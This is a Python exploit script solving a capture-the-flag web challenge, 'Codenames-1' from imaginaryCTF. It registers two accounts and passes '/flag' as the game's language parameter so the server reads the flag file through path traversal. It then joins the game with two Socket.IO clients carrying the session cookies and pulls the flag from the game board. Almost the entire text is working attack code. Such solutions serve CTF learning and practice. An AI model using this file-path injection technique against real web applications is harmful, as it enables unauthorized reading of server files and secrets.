#!/usr/bin/env python3
"""
Exploit script for imaginaryCTF Codenames-1

Strategy:
- Register two users.
- User A creates a game with language=/flag so server loads /flag.txt.
- User B joins the game code.
- Open two Socket.IO clients with each session's cookie and query ?code=....
- When both connect and emit 'join', server emits 'start_game' with 'board' words.
- Extract and print the flag from the board.

Usage:
  python3 solve_codenames1.py http://codenames-1.chal.imaginaryctf.org

Requirements:
  pip install requests python-socketio
"""

import re
import sys
import time
import uuid
import queue
import signal
import threading
from urllib.parse import urljoin

import requests
import socketio


def cookie_header(sess: requests.Session) -> str:
    items = []
    for k, v in sess.cookies.get_dict().items():
        items.append(f"{k}={v}")
    return "; ".join(items)


def register(base: str, sess: requests.Session, username: str, password: str) -> None:
    r = sess.get(urljoin(base, '/register'))
    r = sess.post(urljoin(base, '/register'), data={'username': username, 'password': password}, allow_redirects=True)
    if r.status_code not in (200, 302):
        raise RuntimeError(f"register failed: HTTP {r.status_code}")


def create_game_with_flag(base: str, sess: requests.Session) -> str:
    # Create game with path traversal to /flag.txt by using absolute path language
    r = sess.post(urljoin(base, '/create_game'), data={'language': '/flag'}, allow_redirects=False)
    # Expect redirect to /game/<CODE>
    if r.status_code not in (301, 302, 303, 307, 308):
        # Try again with redirects and sniff final URL
        r = sess.post(urljoin(base, '/create_game'), data={'language': '/flag'}, allow_redirects=True)
    loc = r.headers.get('Location')
    if not loc and r.url:
        loc = r.url
    if not loc:
        raise RuntimeError('Could not determine game URL after create_game')
    m = re.search(r"/game/([A-Z0-9]{6})", loc)
    if not m:
        raise RuntimeError(f"Could not extract game code from redirect: {loc}")
    return m.group(1)


def join_game(base: str, sess: requests.Session, code: str) -> None:
    r = sess.post(urljoin(base, '/join_game'), data={'code': code}, allow_redirects=True)
    if r.status_code not in (200, 302):
        raise RuntimeError(f"join_game failed: HTTP {r.status_code}")


class GameClient:
    def __init__(self, base: str, code: str, cookie: str, name: str):
        self.base = base.rstrip('/')
        self.code = code
        self.cookie = cookie
        self.name = name
        self.sio = socketio.Client(reconnection=False)
        self._start_event = threading.Event()
        self.start_payload = None

        @self.sio.event
        def connect():
            # Immediately announce join like the browser client
            self.sio.emit('join')

        @self.sio.on('start_game')
        def on_start(data):
            self.start_payload = data
            self._start_event.set()

    def connect(self, timeout: float = 5.0):
        url = f"{self.base}?code={self.code}"
        headers = {'Cookie': self.cookie} if self.cookie else {}
        # Add Origin/Referer to satisfy same-origin CORS checks
        headers.setdefault('Origin', self.base)
        headers.setdefault('Referer', f"{self.base}/game/{self.code}")
        headers.setdefault('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118 Safari/537.36')
        # Try polling first (some instances block websockets on codenames-1)
        try:
            self.sio.connect(url, headers=headers, transports=['polling'], wait=True, wait_timeout=timeout)
            return
        except Exception:
            pass
        # Fallback to websocket
        self.sio.connect(url, headers=headers, transports=['websocket'], wait=True, wait_timeout=timeout)

    def wait_start(self, timeout: float = 10.0) -> dict:
        ok = self._start_event.wait(timeout)
        if not ok:
            raise TimeoutError(f"{self.name}: timed out waiting for start_game event")
        return self.start_payload

    def close(self):
        try:
            self.sio.disconnect()
        except Exception:
            pass


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print("Example:")
        print(f"  {sys.argv[0]} http://codenames-1.chal.imaginaryctf.org")
        sys.exit(1)

    base = sys.argv[1].rstrip('/')

    u1 = 'userA_' + uuid.uuid4().hex[:10]
    u2 = 'userB_' + uuid.uuid4().hex[:10]
    pw = uuid.uuid4().hex + 'Aa1!'

    s1 = requests.Session()
    s2 = requests.Session()

    print('[*] Registering user A...')
    register(base, s1, u1, pw)
    print('[*] Creating game with language=/flag ...')
    code = create_game_with_flag(base, s1)
    print(f'[*] Game code: {code}')

    print('[*] Registering user B...')
    register(base, s2, u2, pw)
    print('[*] User B joining game...')
    join_game(base, s2, code)

    # Prepare Socket.IO clients
    c1 = cookie_header(s1)
    c2 = cookie_header(s2)
    gc1 = GameClient(base, code, c1, 'client A')
    gc2 = GameClient(base, code, c2, 'client B')

    # Ensure clean exit on Ctrl+C
    def cleanup(*_):
        gc1.close()
        gc2.close()
        sys.exit(1)
    signal.signal(signal.SIGINT, cleanup)

    print('[*] Connecting Socket.IO clients...')
    # Connect both; order does not matter, but mirror browser behavior
    gc1.connect()
    gc2.connect()

    print('[*] Waiting for start_game...')
    # Either client will receive board; wait on one and fall back to the other
    payload = None
    try:
        payload = gc1.wait_start(timeout=8)
    except Exception:
        payload = gc2.wait_start(timeout=8)

    board = payload.get('board', []) if payload else []
    if not board:
        raise RuntimeError('Did not receive board in start_game payload')

    # Extract possible flag
    flag = None
    for w in board:
        if isinstance(w, str) and re.search(r"ictf\{.*\}", w, re.IGNORECASE):
            flag = w
            break

    print('[*] Board sample:', board[:5])
    if flag:
        print('[+] Flag:', flag)
    else:
        # Fallback: print the first unique word, likely the flag due to repetition
        print('[!] Flag pattern not matched; first word:', board[0])

    gc1.close()
    gc2.close()


if __name__ == '__main__':
    main()
